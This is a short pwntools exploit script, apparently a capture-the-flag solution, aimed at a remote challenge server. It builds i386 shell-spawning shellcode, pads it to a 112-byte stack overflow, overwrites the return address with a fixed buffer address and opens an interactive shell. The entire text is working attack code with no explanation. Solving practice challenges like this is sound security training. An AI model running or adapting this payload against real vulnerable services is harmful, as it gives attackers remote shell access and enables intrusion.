from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28163)
buf2_addr = 0x804a080
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(112,'a') + p32(buf2_addr)
io.sendline(payload)
io.interactive()
